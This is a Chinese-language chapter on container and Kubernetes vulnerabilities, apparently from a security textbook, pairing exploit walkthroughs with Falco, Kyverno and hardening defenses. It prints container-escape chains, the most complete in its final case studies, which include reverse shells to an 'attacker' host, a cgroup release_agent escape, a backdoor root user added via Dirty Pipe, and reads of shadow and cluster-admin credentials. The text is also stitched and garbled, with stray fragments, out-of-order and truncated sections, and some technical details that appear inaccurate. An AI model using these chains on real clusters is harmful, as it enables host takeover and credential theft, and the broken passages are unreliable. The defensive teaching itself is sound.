## 12.1 容器运行时逃逸漏洞

### 12.1.1 CVE-2019-5736：runc 容器逃逸（"runc escape"）

**漏洞概述**：
- **发现时间**：2019 年 2 月
- **影响组件**：runc ≤ 1.0-rc6，Docker ≤ 18.09.2，containerd ≤ 1.2.4
- **CVSS 评分**：8.6（High）
- **攻击复杂度**：需要容器内 root 权限

**漏洞原理深度分析**：

runc 是容器运行时，负责创建和管理容器。当执行 `docker exec` 进入容器时，runc 会打开容器内的 `/proc/self/exe`（指向 runc 二进制自身的符号链接）来执行容器内的命令。

```
漏洞利用流程：

[容器内攻击者]
     │
     ▼ 1. 覆盖 /bin/sh 为指向 /proc/self/exe 的符号链接
     │    ln -sf /proc/self/exe /bin/sh
     │
     ▼ 2. 在容器内创建恶意程序，命名为 /bin/sh 指向的文件
     │    （实际上是指向宿主机的 runc 二进制）
     │
[管理员执行 docker exec]
     │
     ▼ 3. runc 打开 /proc/self/exe（现在指向自身）
     │    准备写入容器内的命令
     │
     ▼ 4. 由于 /bin/sh 是符号链接，runc 打开的是自身二进制文件！
     │    runc 将自己作为文件描述符打开
     │
     ▼ 5. 攻击者在 runc 写入前替换文件内容为恶意程序
     │    （利用 /proc/self/fd/ 中的文件描述符）
     │
     ▼ 6. runc 执行被篡改的二进制 → 宿主机代码执行！
```

**完整复现步骤**（仅用于教育目的，在隔离测试环境执行）：

```bash
# 环境要求：runc ≤ 1.0-rc6 的 Docker 环境

# 步骤 1：创建恶意容器
cat << 'EOF' > Dockerfile
FROM ubuntu:18.04
RUN ln -sf /proc/self/exe /bin/sh
COPY exploit /exploit
RUN chmod +x /exploit
EOF

# 步骤 2：恶意程序（会被 runc 执行）
cat << 'EOF' > exploit.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv) {
    // 运行在宿主机上！
    setuid(0);
    setgid(0);
    system("/bin/bash -c 'echo pwned > /host_pwned.txt'");
    return 0;
}
EOF
gcc -o exploit exploit.c -static

# 步骤 3：构建并运行容器
docker build -t runc-exploit .
docker run -d --name victim runc-exploit sleep 3600

# 步骤 4：管理员执行 exec（触发漏洞）
docker exec victim /exploit

# 步骤 5：检查宿主机
ls /host_pwned.txt  # 文件出现在宿主机！
```

**修复方案**：

```bash
# 1. 升级 runc
# Ubuntu/Debian
apt-get update && apt-get install -y runc

# CentOS/RHEL
yum update runc

# 2. 验证版本
runc --version
# 应 ≥ 1.0-rc7

# 3. 容器安全加固
apiVersion: v1
kind: Pod
spec:
  containers:
  - name: app
    image: myapp:latest
    securityContext:
      readOnlyRootFilesystem: true    # 只读根文件系统
      runAsNonRoot: true              # 禁止 root
      allowPrivilegeEscalation: false # 禁止权限提升
```

**检测方法**：

```yaml
# Falco 规则：检测 /proc/self/exe 符号链接操作
- rule: RunC Escape Attempt
  desc: Detect symbolic link manipulation targeting /proc/self/exe
  condition: >
    spawned_process and
    (proc.name in ("ln", "ln-s") and
     evt.args contains "/proc/self/exe")
  output: >
    Possible runc escape attempt
    (user=%user.name command=%proc.cmdline)
  priority: CRITICAL
```

### 12.1.2 CVE-2022-0847：Dirty Pipe（Linux 内核提权）

**漏洞概述**：
- **发现时间**：2022 年 3 月
- **发现者**：Max Kellermann
- **影响范围**：Linux 内核 5.8 - 5.16.10、5.15.24、5.10.101
- **CVSS 评分**：7.8（High）
- **特殊性**：无需 root 权限，普通用户即可利用

**漏洞原理**：

Linux 内核的管道（pipe）子系统中，`splice()` 系统调用在处理页面时存在漏洞。正常情况下，管道页面应该是只写的，但漏洞允许通过特定的操作序列将页面标记为可写，从而可以修改任意可读文件。

```
Dirty Pipe 的核心问题：

1. splice() 将文件内容零拷贝到管道
2. 管道页面被错误地标记为可写（PIPE_BUF_FLAG_CAN_MERGE）
3. 攻击者向管道写入数据，实际上修改了原始文件！

受影响文件类型：
- SUID 二进制文件（如 /usr/bin/sudo）
- /etc/passwd
- 任意可读文件
```

**K8s 攻击场景**：

```bash
# 在 Pod 中利用 Dirty Pipe 提权
# 步骤 1：检查内核版本
uname -r  # 如果在 5.8-5.16.10 范围内则存在漏洞

# 步骤 2：编译利用程序
cat << 'EOF' > dirty_pipe.c
// 简化版 Dirty Pipe PoC
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>

int main(int argc, char **argv) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <file> <data>\n", argv[0]);
        return 1;
    }
    
    int fd = open(argv[1], O_RDONLY);
    // ... 利用代码 ...
    // 向任意可读文件写入数据
    return 0;
}
EOF

# 步骤 3：利用示例 - 修改 /etc/passwd 添加 root 用户
./dirty_pipe /etc/passwd "backdoor::0:0::/root:/bin/bash"

# 步骤 4：切换用户
su - backdoor  # 无需密码，uid=0
```

**防御措施**：

```bash
# 1. 升级内核
# Ubuntu
apt-get update && apt-get install linux-image-generic

# CentOS
yum update kernel

# 2. 重启生效
reboot

# 3. 验证
uname -r  # ≥ 5.16.11 或 ≥ 5.15.25 或 ≥ 5.10.102

# 4. 容器层防御：使用 gVisor/Kata Containers
# gVisor 拦截系统调用，阻止 Dirty Pipe 利用
apiVersion: node.k8s.io/v1
kind: RuntimeClass
metadata:
  name: gvisor
handler: runsc

# Pod 使用 gVisor
spec:
  runtimeClassName: gvisor
```

**检测规则**：

```yaml
# Falco：检测 SUID 文件修改
- rule: SUID Binary Modification
  desc: Detect modification of SUID binaries
  condition: >
    spawned_process and
    proc.name in ("chmod", "chown") and
    (evt.args contains "u+s" or evt.args contains "4755")
  output: >
    SUID binary modification detected
    (user=%user.name command=%proc.cmdline)
  priority: CRITICAL
```

### 12.1.3 CVE-2024-21626：runc 文件描述符泄漏（Workdir Escape）

**漏洞概述**：
- **发现时间**：2024 年 1 月
- **影响组件**：runc 1.1.11 及以前，containerd 1.6.27/1.7.12 及以前
- **CVSS 评分**：8.6（High）
- **攻击向量**：镜像构建过程 / Dockerfile

**漏洞原理**：

runc 在创建容器时保留了宿主机的当前工作目录（cwd）的文件描述符。如果 Dockerfile 中的 `WORKDIR` 被设置为 `/proc/self/fd/X`（X 是保留的 fd 编号），容器内的进程可以通过这个 fd 访问宿主机文件系统。

```
漏洞利用：

Dockerfile:
FROM ubuntu:22.04
WORKDIR /proc/self/fd/7    # 利用保留的 fd
RUN cd .. && ls             # 现在可以看到宿主机文件

构建时：
docker build -t evil .

运行后容器内：
ls /proc/self/fd/7/../../   # 访问宿主机根目录
```

**恶意 Dockerfile 示例**：

```dockerfile
FROM ubuntu:22.04
# 利用 WORKDIR 指向保留的文件描述符
WORKDIR /proc/self/fd/7
# 向上两级就是宿主机根目录
RUN cd .. && cd .. && \
    ls etc/shadow && \
    echo "backdoor" >> etc/crontab
```

**修复方案**：

```bash
# 1. 升级 runc
runc --version  # 应 ≥ 1.1.12

# 2. 升级 containerd
ctr version  # 应 ≥ 1.6.28 或 ≥ 1.7.13

# 3. CI/CD 中镜像扫描
trivy image --severity HIGH,CRITICAL myimage:latest
# 检测异常 WORKDIR

# 4. 准入控制：禁止可疑 WORKDIR
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: block-suspicious-workdir
spec:
  validationFailureAction: Enforce
  rules:
  - name: check-workdir
    match:
      resources:
        kinds:
        - Pod
    validate:
      message: "WORKDIR pointing to /proc is not allowed"
      pattern:
        spec:
          containers:
          - =(workingDir): "!/proc/*"
```

### 12.1.4 CVE-2024-0132：containerd 构建时容器逃逸

**漏洞概述**：
- **发现时间**：2024 年 8 月
- **影响组件**：containerd ≤ 1.6.33, ≤ 1.7.18
- **CVSS 评分**：7.1（High）
- **攻击向量**：containerd 的 import/export 功能

**漏洞原理**：

containerd 在导入镜像时，未正确验证 layer tar 包中的文件路径，允许通过目录遍历写入宿主机任意位置。

```bash
# 构建恶意镜像层
tar cvf layer.tar ../../../etc/crontab
# 其中包含恶意 crontab 条目

# 导入时覆盖宿主机文件
ctr images import malicious.tar
```

**防御**：
- 升级 containerd ≥ 1.6.34 / 1.7.19
- 只从可信来源导入镜像
- 使用签名验证

## 12.2 K8s API Server 漏洞

### 12.2.1 CVE-2018-1002105：kube-apiserver 权限提升（"k8s privesc"）

**漏洞概述**：
- **发现时间**：2018 年 11 月
- **影响版本**：K8s v1.0.x-1.9.x, v1.10.0-1.10.10, v1.11.0-1.11.4
- **CVSS 评分**：9.8（Critical）
- **攻击复杂度**：只需普通用户权限

**漏洞原理**：

API Server 处理 exec/attach/port-forward 请求时，使用 websocket 升级连接。连接建立后，API Server 将请求转发到 kubelet。漏洞在于：攻击者可以在连接升级后发送额外的请求，这些请求不会被重新认证，而是以 API Server 的权限执行。

```
攻击流程：

[普通用户]
     │
     ▼ 1. 发起合法的 exec 请求
     │    POST /api/v1/namespaces/default/pods/nginx/exec
     │
[API Server]
     │
     ▼ 2. 升级 websocket 连接
     │
[攻击者]
     │
     ▼ 3. 在 websocket 连接上发送额外的请求
     │    这些请求被 API Server 处理，但权限是 API Server 自身！
     │
     ▼ 4. 可以执行任意 API 操作
     │    - 读取所有 Secret
     │    - 创建特权 Pod
     │    - 修改 RBAC
```

**复现代码**：

```python
#!/usr/bin/env python3
"""CVE-2018-1002105 复现（教育用途）"""
import requests
import urllib3
urllib3.disable_warnings()

API = "https://k8s-api-server:6443"
TOKEN = "<normal-user-token>"
HEADERS = {"Authorization": f"Bearer {TOKEN}"}

# 步骤 1：建立 exec websocket 连接
import websocket
ws = websocket.create_connection(
    f"{API}/api/v1/namespaces/default/pods/test/exec?command=/bin/sh",
    header=[f"Authorization: Bearer {TOKEN}"],
    sslopt={"cert_reqs": 0}
)

# 步骤 2：在 websocket 上发送额外请求
# 利用 SPDY 多路复用发送其他 API 请求
# 这些请求以 API Server 权限执行
```

**修复方案**：

```bash
# 升级 K8s
kubectl version  # 应 ≥ v1.10.11 或 ≥ v1.11.5

# 临时缓解：限制 exec/attach 权限
# 只给需要的人 exec 权限
kubectl create role no-exec \
  --verb=get,list,watch \
  --resource=pods
```

### 12.2.2 CVE-2019-11246：kubectl cp 目录遍历

**漏洞概述**：
- **影响版本**：kubectl v1.1.0-1.13.5, v1.14.0
- **CVSS 评分**：5.6（Medium）
- **攻击场景**：从不可信容器复制文件到宿主机

**漏洞原理**：

`kubectl cp` 使用 tar 格式传输文件。攻击者在容器中准备包含目录遍历路径（如 `../../../../etc/crontab`）的 tar 归档，当管理员执行 `kubectl cp pod:/tmp/data ./local` 时，文件被解压到宿主机任意位置。

```bash
# 攻击者在容器内准备恶意 tar
cd /tmp
touch data
tar cvf evil.tar --transform='s,data,../../../../etc/crontab,' data
# 或者使用 GNU tar 的 --absolute-names

# 管理员执行
kubectl cp victim-pod:/tmp/evil.tar ./backup.tar
# 实际覆盖了 /etc/crontab！
```

**修复方案**：

```bash
# 升级 kubectl
kubectl version --client  # 应 ≥ v1.13.6 或 ≥ v1.14.1

# 安全替代方案：
# 方法 1：使用 kubectl exec + tar
kubectl exec victim-pod -- tar cf - /data | tar xf - -C ./backup

# 方法 2：使用 rsync（如果容器内有）
kubectl exec -i victim-pod -- rsync -av /data /backup

# 方法 3：先检查 tar 内容
kubectl cp victim-pod:/tmp/data.tar ./data.tar
tar tvf data.tar | grep "\.\./"  # 检查目录遍历
```

### 12.2.3 CVE-2020-8554：中间人攻击（MITM via ExternalIP）

**漏洞概述**：
- **发现时间**：2020 年 7 月
- **影响版本**：所有 Kubernetes 版本（设计缺陷）
- **CVSS 评分**：5.0（Medium）
- **特殊性**：不是代码漏洞，是设计缺陷

**漏洞原理**：

K8s 允许在同一集群内创建多个具有相同 `externalIPs` 的 Service。kube-proxy 会将流向 ExternalIP 的流量路由到匹配的 Service。攻击者可以创建恶意 Service，使用与合法 Service 相同的 ExternalIP，从而劫持流量。

```yaml
# 合法 Service
apiVersion: v1
kind: Service
metadata:
  name: payment-gateway
  namespace: production
spec:
  type: ClusterIP
  externalIPs:
  - 203.0.113.50  # 支付网关 IP
  selector:
    app: payment
  ports:
  - port: 443

---
# 攻击者创建的恶意 Service（任何命名空间）
apiVersion: v1
kind: Service
metadata:
  name: malicious-gateway
  namespace: attacker-ns
spec:
  type: ClusterIP
  externalIPs:
  - 203.0.113.50  # 相同的 IP！
  selector:
    app: attacker-app
  ports:
  - port: 443
```

**防御方案**：

```yaml
# Kyverno 策略：禁止 ExternalIP
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: restrict-external-ips
spec:
  validationFailureAction: Enforce
  rules:
  - name: check-external-ips
    match:
      resources:
        kinds:
        - Service
    validate:
      message: "ExternalIPs are not allowed"
      pattern:
        spec:
          X(externalIPs): "null"

---
# 如果必须使用 ExternalIP，使用白名单
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: whitelist-external-ips
spec:
  validationFailureAction: Enforce
  rules:
  - name: check-allowed-ips
    match:
      resources:
        kinds:
        - Service
    validate:
      message: "ExternalIP not in whitelist"
      pattern:
        spec:
          =(externalIPs):
          - "203.0.113.0/24"
```

### 12.2.4 CVE-2023-5528：K8s Windows 容器权限提升

**漏洞概述**：
- **发现时间**：2023 年 11 月
- **影响版本**：Windows 节点上的 K8s ≤ 1.28.3, ≤ 1.27.8, ≤ 1.26.11
- **CVSS 评分**：8.8（High）
- **平台**：仅影响 Windows 容器

**漏洞原理**：

Windows 容器与宿主机共享内核对象命名空间。攻击者可以从容器内访问宿主机的内核对象，利用 Windows 特定的权限提升技术逃逸。

**防御**：
- 升级 K8s 到修复版本
- 使用 Hyper-V 隔离的 Windows 容器（类似 Kata Containers）
- 限制 Windows 工作负载的权限

## 12.3 K8s Dashboard 漏洞

### 12.3.1 CVE-2018-18264：Dashboard 认证绕过

**漏洞概述**：
- **发现时间**：2018 年 10 月
- **影响版本**：Dashboard ≤ 1.10.0
- **CVSS 评分**：10.0（Critical）
- **攻击复杂度**：极低（只需访问 Dashboard）

**漏洞原理**：

K8s Dashboard 默认配置下，登录页面提供了"跳过"按钮，允许用户不经过认证直接访问。如果 Dashboard 绑定的 ServiceAccount 具有 cluster-admin 权限，攻击者无需任何凭证即可获得集群完全控制权。

```
攻击流程：

[攻击者扫描集群]
     │
     ▼ 发现 Dashboard NodePort（如 30000）
     │
     ▼ 访问 http://node-ip:30000
     │
     ▼ 点击"跳过"按钮
     │
     ▼ 直接进入 Dashboard
     │
     ▼ 如果绑定 cluster-admin：
     │    - 查看所有 Secret
     │    - 创建/删除任意资源
     │    - 获取集群完全控制权
```

**完整攻击演示**：

```bash
# 步骤 1：扫描 Dashboard
curl http://node-ip:30000
# 返回 Dashboard HTML

# 步骤 2：获取 ServiceAccount Token
# 在 Dashboard 中执行：
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# 步骤 3：使用 Token 操作集群
TOKEN="<从 Dashboard 获取的 Token>"
kubectl --token=$TOKEN get secrets --all-namespaces

# 步骤 4：创建后门 Pod
kubectl --token=$TOKEN apply -f backdoor.yaml
```

**修复方案**：

```yaml
# 方法 1：移除跳过功能
apiVersion: v1
kind: ConfigMap
metadata:
  name: kubernetes-dashboard-settings
  namespace: kubernetes-dashboard
data:
  _global: |
    {
      "disableSettings": true,
      "disableSkipButton": true
    }

---
# 方法 2：创建最小权限 ServiceAccount
apiVersion: v1
kind: ServiceAccount
metadata:
  name: dashboard-viewer
  namespace: kubernetes-dashboard
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: dashboard-viewer
  namespace: kubernetes-dashboard
subjects:
- kind: ServiceAccount
  name: dashboard-viewer
roleRef:
  kind: Role
  name: view-only  # 只读权限
  apiGroup: rbac.authorization.k8s.io

---
# 方法 3：不暴露 Dashboard
# 只通过 kubectl proxy 访问（本地）
kubectl proxy
# 访问 http://localhost:8001/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/

---
# 方法 4：使用 NetworkPolicy 限制访问
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: dashboard-restrict
  namespace: kubernetes-dashboard
spec:
  podSelector:
    matchLabels:
      k8s-app: kubernetes-dashboard
  policyTypes:
  - Ingress
  ingress:
  - from:
    - ipBlock:
        cidr: 10.0.0.0/8  # 只允许内网访问
```

## 12.4 Kubelet 漏洞与配置风险

### 12.4.1 Kubelet 未授权访问（10255 端口）

**风险概述**：

Kubelet 有两个关键端口：

| 端口 | 默认状态 | 认证 | 风险 |
|------|---------|------|------|
| 10250 | 启用（必须） | 需要客户端证书 | 配置错误时高危 |
| 10255 | 已废弃 | 无认证 | **极高** |

**攻击场景**：

```bash
# 10255 只读端口（默认无认证）
# 列出节点上所有 Pod
curl http://node-ip:10255/pods

# 获取节点资源信息
curl http://node-ip:10255/spec

# 获取监控指标（可能泄露敏感信息）
curl http://node-ip:10255/metrics

# 10250 认证绕过（配置错误时）
# 如果 anonymous 认证启用：
curl -k https://node-ip:10250/pods

# 如果证书验证未启用：
curl -k https://node-ip:10250/run/default/nginx/nginx \
  -d "cmd=cat /etc/passwd"
# 任意命令执行！
```

**修复配置**：

```yaml
# /var/lib/kubelet/config.yaml
apiVersion: kubelet.config.k8s.io/v1beta1
kind: KubeletConfiguration
authentication:
  anonymous:
    enabled: false      # 禁用匿名认证
  webhook:
    enabled: true       # 启用 Webhook 认证
  x509:
    clientCAFile: /etc/kubernetes/pki/ca.crt
authorization:
  mode: Webhook         # Webhook 授权模式
readOnlyPort: 0         # 禁用 10255 端口

# 验证配置
systemctl restart kubelet
ss -tlnp | grep -E "10250|10255"
```

## 12.5 Ingress Controller 漏洞

### 12.5.1 CVE-2021-25742：Ingress-Nginx 配置注入

**漏洞概述**：
- **发现时间**：2021 年 10 月
- **影响版本**：ingress-nginx ≤ 1.0.0
- **CVSS 评分**：7.5（High）
- **攻击向量**：Ingress 资源注解

**漏洞原理**：

Ingress-Nginx Controller 允许通过注解（annotations）向 nginx.conf 注入自定义配置。如果未正确过滤，攻击者可以注入任意 nginx 指令，包括 `lua` 代码执行。

```yaml
# 恶意 Ingress
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: malicious-ingress
  annotations:
    # 注入自定义 nginx 配置
    nginx.ingress.kubernetes.io/server-snippet: |
      location /evil {
        content_by_lua_block {
          os.execute("id > /tmp/pwned")
        }
      }
spec:
  rules:
  - host: victim.com
    http:
      paths:
      - path: /
        pathType: Prefix
        backend:
          service:
            name: backend
            port:
              number: 80
```

**防御方案**：

```yaml
# Kyverno 策略：限制 Ingress 注解
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: restrict-ingress-annotations
spec:
  validationFailureAction: Enforce
  rules:
  - name: block-dangerous-annotations
    match:
      resources:
        kinds:
        - Ingress
    validate:
      message: "Dangerous annotations are not allowed"
      pattern:
        metadata:
          =(annotations):
            # 禁止注入配置
            X(nginx.ingress.kubernetes.io/server-snippet): "null"
            X(nginx.ingress.kubernetes.io/configuration-snippet): "null"
            X(nginx.ingress.kubernetes.io/modsecurity-snippet): "null"
```

```yaml
  - to:
    - ipBlock:
```

## 12.7 容器逃逸综合案例

### 12.7.1 特权容器 + hostPath 逃逸（经典模式）

```yaml
# 最危险的 Pod 配置
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod
spec:
  hostPID: true        # 共享 PID 命名空间
  hostNetwork: true    # 共享网络命名空间
  hostIPC: true        # 共享 IPC 命名空间
  containers:
  - name: escape
    image: ubuntu
    securityContext:
      privileged: true  # 特权容器
      allowPrivilegeEscalation: true
    volumeMounts:
    - name: host-root
      mountPath: /host
    - name: docker-sock
      mountPath: /var/run/docker.sock
  volumes:
  - name: host-root
    hostPath:
      path: /
  - name: docker-sock
    hostPath:
      path: /var/run/docker.sock
```

**攻击链**：

```bash
# 进入容器
kubectl exec -it escape-pod -- bash

# 1. 确认特权
id          # uid=0(root)
cat /proc/self/status | grep Cap
# CapEff: 0000003fffffffff (所有能力)

# 2. chroot 到宿主机
chroot /host /bin/bash

# 3. 现在你在宿主机上
ps aux | head      # 看到宿主机进程
cat /etc/shadow    # 读取密码

# 4. 持久化后门
# 方法 A：crontab
echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'" \
  >> /host/etc/crontab

# 方法 B：静态 Pod
# /etc/kubernetes/manifests/backdoor.yaml
cat << 'EOF' > /host/etc/kubernetes/manifests/backdoor.yaml
apiVersion: v1
kind: Pod
metadata:
  name: backdoor
spec:
  hostNetwork: true
  containers:
  - name: backdoor
    image: alpine
    command: ["/bin/sh", "-c", "nc -e /bin/sh attacker.com 4444"]
EOF
# kubelet 会自动创建这个 Pod

# 5. 读取集群凭证
cat /host/etc/kubernetes/admin.conf
# 获取整个集群的管理权限

# 6. 如果挂载了 docker.sock
docker -H unix:///var/run/docker.sock ps
docker -H unix:///var/run/docker.sock run -v /:/host --rm -it ubuntu chroot /host
```

**检测指标**：

```yaml
# Falco 规则集
- rule: Privileged Container Started
  desc: Detect privileged container creation
  condition: >
    spawned_process and
    container and
    container.privileged=true
  output: >
    Privileged container started
    (user=%user.name container=%container.name)
  priority: CRITICAL

- rule: Mount Host Root FS
  desc: Detect mounting of host root filesystem
  condition: >
    spawned_process and
    proc.name=mount and
    evt.args contains "/"
  output: >
    Host root filesystem mounted
  priority: CRITICAL

- rule: Chroot in Container
  desc: Detect chroot system call
  condition: >
    spawned_process and
    proc.name=chroot
  output: >
    chroot executed in container
  priority: WARNING
```

### 12.7.2 CAP_SYS_ADMIN + Cgroup v1 逃逸

```bash
# 容器有 CAP_SYS_ADMIN（或 --privileged）
# 利用 cgroup release_agent 机制

# 步骤 1：创建 cgroup 目录
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x

# 步骤 2：启用 release_agent
echo 1 > /tmp/cgrp/x/notify_on_release

# 步骤 3：找到宿主机路径
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)

# 步骤 4：设置 release_agent 路径
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# 步骤 5：写入恶意命令
cat << 'EOF' > /cmd
#!/bin/sh
bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'
EOF
chmod a+x /cmd

# 步骤 6：触发 release_agent
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# 当 cgroup 为空时，release_agent 在宿主机上执行！
```

**防御**：
- 禁用 CAP_SYS_ADMIN
- 使用 cgroup v2（更难利用）
- 使用 seccomp 限制 mount 系统调用

### 12.7.3 Docker Socket 挂载逃逸

```bash
# 容器内可以操作 Docker API

  --privileged -v /:/host --rm -it ubuntu chroot /host
```

### 12.13.2 漏洞扫描自动化

```bash
#!/bin/bash
# daily-vuln-scan.sh

NAMESPACES=$(kubectl get ns -o jsonpath='{.items[*].metadata.name}')
REPORT_FILE="/var/log/k8s-vuln-scan-$(date +%Y%m%d).json"

# 1. 镜像漏洞扫描
echo "扫描镜像漏洞..."
kubectl get pods -A -o json | \
  jq -r '[.items[].spec.containers[].image] | unique | .[]' | \
  while read img; do
    echo "扫描: $img"
    trivy image --severity HIGH,CRITICAL --format json --quiet "$img" 2>/dev/null
  done | jq -s '.' > "$REPORT_FILE"

# 2. 集群配置扫描
echo "扫描集群配置..."
kube-bench run --targets node --benchmark cis-1.8 > /var/log/kube-bench-$(date +%Y%m%d).log

# 3. 框架合规扫描
echo "扫描框架合规..."
kubescape scan framework nsa,mitre --format json > /var/log/kubescape-$(date +%Y%m%d).json

# 4. 汇总告警
CRITICAL_COUNT=$(cat "$REPORT_FILE" | jq '[.[]?.Results[]?.Vulnerabilities? | select(. != null) | .[] | select(.Severity=="CRITICAL")] | length')
if [ "$CRITICAL_COUNT" -gt 0 ]; then
  echo "发现 $CRITICAL_COUNT 个严重漏洞!"
  # 发送告警
fi
```

## 12.12 本章小结

| 漏洞类型 | 代表 CVE | 核心防御 |
|---------|---------|---------|
| runc 逃逸 | CVE-2019-5736, CVE-2024-21626 | 升级 runc、只读根文件系统 |
| 内核提权 | CVE-2022-0847 | 内核升级、gVisor/Kata |
| API Server 权限提升 | CVE-2018-1002105 | 升级 K8s、限制子资源权限 |
| MITM 劫持 | CVE-2020-8554 | NetworkPolicy、禁止 ExternalIP |
| Dashboard 绕过 | CVE-2018-18264 | 禁用跳过登录、最小权限 SA |
| kubelet 未授权 | 配置问题 | 禁用 10255、启用 Webhook 认证 |
| Ingress 注入 | CVE-2021-25742 | 升级、审查注解、Kyverno |
| 供应链投毒 | Log4j、xz Utils | 镜像扫描、签名验证、快速更新 |
| Windows 容器提权 | CVE-2023-5528 等 | 升级 K8s、Hyper-V 隔离 |

**关键原则**：
1. **及时更新**：关注 CVE 公告，及时升级受影响组件
2. **纵深防御**：单一措施无法防御所有漏洞，需要多层防护
3. **最小权限**：特权容器、敏感挂载应最小化
4. **持续扫描**：定期使用 Trivy、kube-bench、Kubescape 扫描

- CVE 数据库：https://cve.mitre.org/
- NVD：https://nvd.nist.gov/
